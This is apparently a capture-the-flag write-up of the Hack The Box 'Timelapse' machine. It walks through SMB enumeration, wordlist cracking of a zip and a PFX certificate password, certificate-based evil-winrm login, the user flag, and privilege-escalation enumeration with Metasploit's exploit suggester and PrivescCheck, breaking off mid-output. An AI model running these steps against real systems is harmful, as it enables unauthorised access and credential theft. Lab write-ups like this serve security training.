# Timelapse Hackthebox

## Enum

### Nmap

```bash
host=10.129.153.232;ports=$(nmap -p- --min-rate=1000 -T4 $host | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) ;nmap -sC -sV -p$ports $host | tee nmap.txt
```
scan with `nmap` script found nothing

```bash
┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse]
└─# nmap -script smb-vuln* -p139,445 10.129.153.232
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-27 10:27 +07
Nmap scan report for timelapse.htb0 (10.129.153.232)
Host is up (0.25s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds
```

try to scan with `nmap` for `udp` protocol

```bash
┌──(bop㉿BOP-PC)-[~/Workspace/hackthebox/timelapse]
└─$ sudo nmap -sU -O -p-  10.129.153.232 | tee nmap_udp.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-27 10:27 +07
```

try list smb share file
```
┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse]
└─# smbclient -L \\\\10.129.154.12
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.154.12 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse]
└─# smbclient -L 10.129.154.12
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.154.12 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse]
└─#
```


```
┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse]
└─# smbclient \\\\10.129.154.12\\Shares
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 22:39:15 2021
  ..                                  D        0  Mon Oct 25 22:39:15 2021
  Dev                                 D        0  Tue Oct 26 02:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 22:48:42 2021

                6367231 blocks of size 4096. 1187436 blocks available
smb: \>
```

Download the whole folder to local with this command
[https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient](https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient)
```powershell
smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```

we found `winrm_backup.zip` file, try to crack it password to unzip with `zip2john`

Afthe unzip the file we have `pfx` file. That is certificate file
Try to read info from it with `openssl`, but need password again, the last one for `unzip` not work here.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -info
```
use this to crack the password

[https://github.com/crackpkcs12/crackpkcs12](https://github.com/crackpkcs12/crackpkcs12)

```bash
┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse/crackpkcs12]
└─# crackpkcs12 -d /usr/share/wordlists/rockyou.txt ../Dev/legacyy_dev_auth.pfx

Dictionary attack - Starting 12 threads

*********************************************************
Dictionary attack - Thread 8 - Password found: thuglegacy
*********************************************************


┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse/crackpkcs12]
└─#
```
PEM PASS:
```
thuglegacy
```
open the certificate file
```bash
┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse/Dev]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -info
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIhWwox8QSl54CAggA
MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECIIn3yn1KVk6BIIEyLYgwvIbWHHX
T95o8ZhoUaVWGYINjFXu4tjqfDl+3K+t9iyM/+aMkUpNwvkcxhTmubmqKcuy28O2
1Nu3qf5X/a98melpe91I36wXUEOBrDa+vQ+On59xvuF7atADuNO3RCnrTDpPmGvb
vXfM7jZXIf1aB06YL/cx5/GEihcmVZJ0H4NWPzoEH1MvD+SL17EfbWpdbA3PdtjD
9C9BrW0PEX/GLaoO/GAtKiZQGaHcBYS/QFZs8ZN34ivaxRzcCmwPGBItA8LyH4GH
UOvhUSMPHrFhdj4fIcoViMDeut6HxnwCwPa7yQI7rXv6ctqn9WP1FzRIPoaUOCtB
FqvT/62twxdLWikzyblafUjF5l4UJQIr7w/Bo+boTRZG4+sdUeEenmx5LzMWTnS3
ORI2BZZZ76sfacpuDSOJuyOj5Mx9FPqDuuBfx9u7epipSBJovS77IbBDRDPlomLt
VnLoydHdevQ+UR421TEDGjUt0LS4pe+xF9o04zrqafGl3aah6fHtkzWEsjHcAVGi
vuUJTLNvrhand8Zq0pZTzBti35bq0xmDZQ9MCCF6nwgwCrQ1J3RP43kd524pxCLj
P2QQt0cgSkNFDdTdnhAufhb0a9AQb2V/TVlqmz1E5bcdcucfuIy0Hi6dfMcVVYiS
yPHwtG6F0UcRPscxoje4SOw1hqucHsnUa6UevrejoA+sDO+DjT/OiwddW6J7/4MY
bTUwpzFop+1M9euQetfzcfoBKMJhgUqbrrDbfeGLd8SK+C5LqJJOadJzFAkltkTF
AAQQLVOkheVGpmrd335rJm6vanF1TRPWLki7gIaciFJKSrEopA3twtIultrzFT8K
wYWwH7ERE45pDw6Cyf80kBvPpjO2gdyC6b9k2G3/0XozE6Wec7mk4r0IT7EH7h5d
h7xlDRpSOKGAhi+s/VKopZnEvfBR4z5n2Kc1Xree4Hd851E6n58rYYqx6KPlAJYP
EEWWtiJY8EU9ACLOctZi9z4ZrnUFRuTGqi99lX29LSIUqP/ALxqY20Otd0BG4h6n
nq+XwboOSXeB1TMQWG2ug446Zn/ROH+Ie9tJ5adaJqVKknAn6/cWvXH/OEmSNvRQ
7PfOr0Msb3JhvmhW1M3LuMNSM9pCMBX2ZWQ1iMVOJwAPQnqeHIpjs7fKrxffSSpe
rgTCUab3a4Lew/cHpClW5iFU+sBoK5vy5i6i7xAJ2LPX973VlxCGQILyG2BBUvaL
uzXsYMWEmWWkKB37FW6zrxyDkSaIgEY/LjPsjIz7gV/PE5IJ+xGIAWVUnL54oA4E
R/cH3DsrLpz3AQz3x69I8fwkVdoJHcuywmDc389xo7NFHfbvur3TNmNndQL1QTSJ
1p2OZEvNbaG/88p3wsh+W0z6W10jH7lmZYja73By4ZnNj0p9Q2vGS8gZmT14NJ61
E6Mstmce+UF4ajbFd7S4RGN6WE4z35GXsH69Wf+i25jYD4oh7bNae0mQRHPayi2A
hfEmbpJfNgs2TaYQ/yrwGFpqSdsuvCEXdqfSsAPdv+wIsN/ousinvS1b4CGqzQvu
gJz4MLUFdUlCHDkcXpP7fCFpP6pcKaIQJ3LXVpZIf9gKuWfHNkDixjZmkTJiM+Da
KDGiZwBTj2di5cm/VPvQOQ==
-----END ENCRYPTED PRIVATE KEY-----
PKCS7 Data
Certificate bag
Bag Attributes
    localKeyID: 01 00 00 00
subject=CN = Legacyy

issuer=CN = Legacyy

-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----

┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/timelapse/Dev]
```



```bash
evil-winrm -c key/cert.txt -k key/key.txt -i 10.129.154.12 -P 8596 -s '/home/bop/Workspace/hackthebox/timelapse/ps1_scripts/' -e '/home/bop/Workspace/hackthebox/timelapse/exe_files/' -S
```

User:
```
legacyy
```

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/27/2022   1:58 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
15f435a18beb988fbbdc975f5ea3b75c
*Evil-WinRM* PS C:\Users\legacyy\Desktop>
```

```powershell
whoami /all
Enter PEM pass phrase:

USER INFORMATION
----------------

User Name         SID
================= ============================================
timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603


GROUP INFORMATION
-----------------

Group Name                                  Type             SID
    Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0
    Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580
    Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545
    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554
    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2
    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11
    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15
    Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1
    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\legacyy\Desktop>
```


```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> services

Path                                                                           Privileges Service

----                                                                           ---------- -------

C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                           False ADWS

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                    False PerfHost

"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"          False Sense

C:\Windows\servicing\TrustedInstaller.exe                                           False TrustedInstaller
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"              False VGAuthService
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                 False VMTools

"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2202.4-0\NisSrv.exe"        True WdNisSvc

"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2202.4-0\MsMpEng.exe"       True WinDefend

"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                False WMPNetworkSvc

*Evil-WinRM* PS C:\Users\legacyy\Desktop>
```


```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> netstat -ano
Enter PEM pass phrase:

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2992
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       472
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1084
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1484
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       608
  TCP    0.0.0.0:49696          0.0.0.0:0              LISTENING       3048
  TCP    0.0.0.0:64007          0.0.0.0:0              LISTENING       3000
  TCP    10.129.154.12:53       0.0.0.0:0              LISTENING       3048
  TCP    10.129.154.12:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.154.12:5986     10.10.14.23:56236      ESTABLISHED     4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3048
  TCP    [::]:88                [::]:0                 LISTENING       628
  TCP    [::]:135               [::]:0                 LISTENING       888
  TCP    [::]:389               [::]:0                 LISTENING       628
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       628
  TCP    [::]:593               [::]:0                 LISTENING       888
  TCP    [::]:636               [::]:0                 LISTENING       628
  TCP    [::]:3268              [::]:0                 LISTENING       628
  TCP    [::]:3269              [::]:0                 LISTENING       628
  TCP    [::]:5986              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2992
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       472
  TCP    [::]:49665             [::]:0                 LISTENING       1084
  TCP    [::]:49666             [::]:0                 LISTENING       1484
  TCP    [::]:49667             [::]:0                 LISTENING       628
  TCP    [::]:49673             [::]:0                 LISTENING       628
  TCP    [::]:49674             [::]:0                 LISTENING       628
  TCP    [::]:49684             [::]:0                 LISTENING       608
  TCP    [::]:49696             [::]:0                 LISTENING       3048
  TCP    [::]:64007             [::]:0                 LISTENING       3000
  TCP    [::1]:53               [::]:0                 LISTENING       3048
  TCP    [::1]:389              [::1]:49675            ESTABLISHED     628
  TCP    [::1]:389              [::1]:49676            ESTABLISHED     628
  TCP    [::1]:389              [::1]:53878            ESTABLISHED     628
  TCP    [::1]:49675            [::1]:389              ESTABLISHED     2416
  TCP    [::1]:49676            [::1]:389              ESTABLISHED     2416
  TCP    [::1]:53878            [::1]:389              ESTABLISHED     3048
  TCP    [dead:beef::51]:53     [::]:0                 LISTENING       3048
  TCP    [dead:beef::2483:bced:d1c1:21cf]:53  [::]:0                 LISTENING       3048
  TCP    [fe80::2483:bced:d1c1:21cf%13]:53  [::]:0                 LISTENING       3048
  TCP    [fe80::2483:bced:d1c1:21cf%13]:135  [fe80::2483:bced:d1c1:21cf%13]:57081  ESTABLISHED     888  TCP    [fe80::2483:bced:d1c1:21cf%13]:389  [fe80::2483:bced:d1c1:21cf%13]:53881  ESTABLISHED     628  TCP    [fe80::2483:bced:d1c1:21cf%13]:389  [fe80::2483:bced:d1c1:21cf%13]:53885  ESTABLISHED     628  TCP    [fe80::2483:bced:d1c1:21cf%13]:389  [fe80::2483:bced:d1c1:21cf%13]:53894  ESTABLISHED     628  TCP    [fe80::2483:bced:d1c1:21cf%13]:49667  [fe80::2483:bced:d1c1:21cf%13]:57077  ESTABLISHED     628
  TCP    [fe80::2483:bced:d1c1:21cf%13]:49667  [fe80::2483:bced:d1c1:21cf%13]:57082  ESTABLISHED     628
  TCP    [fe80::2483:bced:d1c1:21cf%13]:49667  [fe80::2483:bced:d1c1:21cf%13]:64004  ESTABLISHED     628
  TCP    [fe80::2483:bced:d1c1:21cf%13]:49667  [fe80::2483:bced:d1c1:21cf%13]:64045  ESTABLISHED     628
  TCP    [fe80::2483:bced:d1c1:21cf%13]:53881  [fe80::2483:bced:d1c1:21cf%13]:389  ESTABLISHED     3000
  TCP    [fe80::2483:bced:d1c1:21cf%13]:53885  [fe80::2483:bced:d1c1:21cf%13]:389  ESTABLISHED     3000
  TCP    [fe80::2483:bced:d1c1:21cf%13]:53894  [fe80::2483:bced:d1c1:21cf%13]:389  ESTABLISHED     3048
  TCP    [fe80::2483:bced:d1c1:21cf%13]:57076  [fe80::2483:bced:d1c1:21cf%13]:135  TIME_WAIT       0
  TCP    [fe80::2483:bced:d1c1:21cf%13]:57077  [fe80::2483:bced:d1c1:21cf%13]:49667  ESTABLISHED     628
  TCP    [fe80::2483:bced:d1c1:21cf%13]:57081  [fe80::2483:bced:d1c1:21cf%13]:135  ESTABLISHED     1280
  TCP    [fe80::2483:bced:d1c1:21cf%13]:57082  [fe80::2483:bced:d1c1:21cf%13]:49667  ESTABLISHED     1280
  TCP    [fe80::2483:bced:d1c1:21cf%13]:57084  [fe80::2483:bced:d1c1:21cf%13]:135  TIME_WAIT       0
  TCP    [fe80::2483:bced:d1c1:21cf%13]:57087  [fe80::2483:bced:d1c1:21cf%13]:135  TIME_WAIT       0
  TCP    [fe80::2483:bced:d1c1:21cf%13]:64004  [fe80::2483:bced:d1c1:21cf%13]:49667  ESTABLISHED     3000
  TCP    [fe80::2483:bced:d1c1:21cf%13]:64045  [fe80::2483:bced:d1c1:21cf%13]:49667  ESTABLISHED     628
  ```

  ```bash
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.154.12 - Collecting local exploits for x64/windows...
[*] 10.129.154.12 - 32 exploit checks are being tried...
[+] 10.129.154.12 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in
  the Registry under the current user hive, and inserting a custom
  command that will get invoked when Window backup and restore is
  launched. It will spawn a second shell that has the UAC flag turned
  off. This module modifies a registry key, but cleans up the key once
  the payload has been invoked.
[+] 10.129.154.12 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
  This exploit leverages a file write vulnerability in the print
  spooler service which will restart if stopped. Because the service
  cannot be stopped long enough to remove the dll, there is no way to
  remove the dll once it is loaded by the service. Essentially, on
  default settings, this module adds a permanent elevated backdoor.
[+] 10.129.154.12 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
  This exploit leverages a file write vulnerability in the print
  spooler service which will restart if stopped. Because the service
  cannot be stopped long enough to remove the dll, there is no way to
  remove the dll once it is loaded by the service. Essentially, on
  default settings, this module adds a permanent elevated backdoor.
[+] 10.129.154.12 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
  The Windows Print Spooler has a privilege escalation vulnerability
  that can be leveraged to achieve code execution as SYSTEM. The
  `SpoolDirectory`, a configuration setting that holds the path that a
  printer's spooled jobs are sent to, is writable for all users, and
  it can be configured via `SetPrinterDataEx()` provided the caller
  has the `PRINTER_ACCESS_ADMINISTER` permission. If the
  `SpoolDirectory` path does not exist, it will be created once the
  print spooler reinitializes. Calling `SetPrinterDataEx()` with the
  `CopyFiles\` registry key will load the dll passed in as the `pData`
  argument, meaning that writing a dll to the `SpoolDirectory`
  location can be loaded by the print spooler. Using a directory
  junction and UNC path for the `SpoolDirectory`, the exploit writes a
  payload to `C:\Windows\System32\spool\drivers\x64\4` and loads it by
  calling `SetPrinterDataEx()`, resulting in code execution as SYSTEM.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) >
  ```


  ```powershell
  *Evil-WinRM* PS C:\Users\legacyy\Documents> . .\priv_check.ps1; Invoke-PrivescCheck -Extended
+------+------------------------------------------------+------+
| TEST | USER > Identity                                | INFO |
+------+------------------------------------------------+------+
| DESC | Get the full name of the current user (domain +       |
|      | username) along with the associated Security          |
|      | Identifier (SID).                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name             : TIMELAPSE\legacyy
SID              : S-1-5-21-671920749-559770252-3318990721-1603
IntegrityLevel   : Medium Plus Mandatory Level (S-1-16-8448)
SessionId        : 0
TokenId          : 00000000-00b97c89
AuthenticationId : 00000000-0081dc9e
OriginId         : 00000000-000003e4
ModifiedId       : 00000000-0081dcaa
Source           : Advapi (00000000-0081dc97)




+------+------------------------------------------------+------+
| TEST | USER > Groups                                  | INFO |
+------+------------------------------------------------+------+
| DESC | List all the groups that are associated to the        |
|      | current user's token.                                 |
+------+-------------------------------------------------------+
[*] Found 12 result(s).

Name                                        Type           SID
----                                        ----           ---
TIMELAPSE\Domain Users                      Group          S-1-5-21-671920749-559770252-3318990721-513
Everyone                                    WellKnownGroup S-1-1-0
BUILTIN\Remote Management Users             Alias          S-1-5-32-580
BUILTIN\Users                               Alias          S-1-5-32-545
BUILTIN\Pre-Windows 2000 Compatible Access  Alias          S-1-5-32-554
NT AUTHORITY\NETWORK                        WellKnownGroup S-1-5-2
NT AUTHORITY\Authenticated Users            WellKnownGroup S-1-5-11
NT AUTHORITY\This Organization              WellKnownGroup S-1-5-15
NT AUTHORITY\LogonSessionId_0_8510621       LogonSession   S-1-5-5-0-8510621
TIMELAPSE\Development                       Group          S-1-5-21-671920749-559770252-3318990721-3101
Authentication authority asserted identity  WellKnownGroup S-1-18-1
Mandatory Label\Medium Plus Mandatory Level Label          S-1-16-8448



+------+------------------------------------------------+------+
| TEST | USER > Restricted SIDs                         | INFO |
+------+------------------------------------------------+------+
| DESC | List the restricted SIDs that are associated to the   |
|      | current user's token, if it is WRITE RESTRICTED.      |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | USER > Privileges                              | INFO |
+------+------------------------------------------------+------+
| DESC | List the current user's privileges and identify the   |
|      | ones that can be leveraged for local privilege        |
|      | escalation.                                           |
+------+-------------------------------------------------------+
[*] Found 3 result(s).

Name                          State   Description                    Exploitable
----                          -----   -----------                    -----------
SeMachineAccountPrivilege     Enabled Add workstations to domain           False
SeChangeNotifyPrivilege       Enabled Bypass traverse checking             False
SeIncreaseWorkingSetPrivilege Enabled Increase a process working set       False



+------+------------------------------------------------+------+
| TEST | USER > Environment Variables                   | INFO |
+------+------------------------------------------------+------+
| DESC | List the environment variables of the current process |
|      | and try to identify any potentially sensitive         |
|      | information such as passwords or API secrets. This    |
|      | check is simply based on keyword matching and might   |
|      | not be entirely reliable.                             |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | SERVICES > Non-default Services                | INFO |
+------+------------------------------------------------+------+
| DESC | List all registered services and filter out the ones  |
|      | that are built into Windows. It does so by parsing    |
|      | the target executable's metadata.                     |
+------+-------------------------------------------------------+
[*] Found 4 result(s).


Name        : ssh-agent
DisplayName : OpenSSH Authentication Agent
ImagePath   : C:\Windows\System32\OpenSSH\ssh-agent.exe
User        : LocalSystem
StartMode   : Disabled

Name        : VGAuthService
DisplayName : VMware Alias Manager and Ticket Service
ImagePath   : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : vm3dservice
DisplayName : @oem3.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service
ImagePath   : C:\Windows\system32\vm3dservice.exe
User        : LocalSystem
StartMode   : Automatic

Name        : VMTools
DisplayName : VMware Tools
ImagePath   : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
User        : LocalSystem
StartMode   : Automatic




+------+------------------------------------------------+------+
| TEST | SERVICES > Service Permissions                 | VULN |
+------+------------------------------------------------+------+
| DESC | Interact with the Service Control Manager (SCM) and   |
|      | check whether the current user can modify any         |
|      | registered service.                                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | SERVICES > Registry Permissions                | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the registry and check whether the current user |
|      | can modify the configuration of any registered        |
|      | service.                                              |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | SERVICES > Binary Permissions                  | VULN |
+------+------------------------------------------------+------+
| DESC | List all services and check whether the current user  |
|      | can modify the target executable or write files in    |
|      | its parent folder.                                    |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | SERVICES > Unquoted Path (info)                | INFO |
+------+------------------------------------------------+------+
| DESC | List registered services and check whether any of     |
|      | them is configured with an unquoted path.             |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | SERVICES > Unquoted Path                       | VULN |
+------+------------------------------------------------+------+
| DESC | List registered services and check whether any of     |
|      | them is configured with an unquoted path that can be  |
|      | exploited.                                            |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | SERVICES > SCM Permissions                     | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the current user can perform any        |
|      | privileged actions on the Service Control Manager     |
|      | (SCM).                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | APPS > Non-default Apps                        | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate non-default and third-party applications by |
|      | parsing the registry.                                 |
+------+-------------------------------------------------------+
[*] Found 3 result(s).

Name         FullName
----         --------
LAPS         C:\Program Files\LAPS
VMware       C:\Program Files\VMware
VMware Tools C:\Program Files\VMware\VMware Tools



+------+------------------------------------------------+------+
| TEST | APPS > Modifiable Apps                         | VULN |
+------+------------------------------------------------+------+
| DESC | List non-default and third-party applications and     |
|      | report the ones that can be modified by the current   |
|      | user.                                                 |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | APPS > Startup Apps (info)                     | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the system-wide applications that are run   |
|      | on start-up.                                          |
+------+-------------------------------------------------------+
[*] Found 2 result(s).


Name         : SecurityHealth
Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityHealth
Data         : %windir%\system32\SecurityHealthSystray.exe
IsModifiable : False

Name         : VMware User Process
Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VMware User Process
Data         : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
IsModifiable : False




+------+------------------------------------------------+------+
| TEST | APPS > Startup Apps                            | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the system-wide applications that are run   |
|      | on start-up and check whether they can be modified by |
|      | the current user.                                     |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | APPS > Running Processes                       | INFO |
+------+------------------------------------------------+------+
| DESC | List processes that are not owned by the current user |
|      | and filter out common processes such as               |
|      | 'svchost.exe'.                                        |
+------+-------------------------------------------------------+
[*] Found 19 result(s).

Name                                    Id Path SessionId User
----                                    -- ---- --------- ----
dfsrs                                 3000              0
dfssvc                                2412              0
dllhost                               3692              0
dns                                   3048              0
fontdrvhost                           4260              0
fontdrvhost                           4268              1
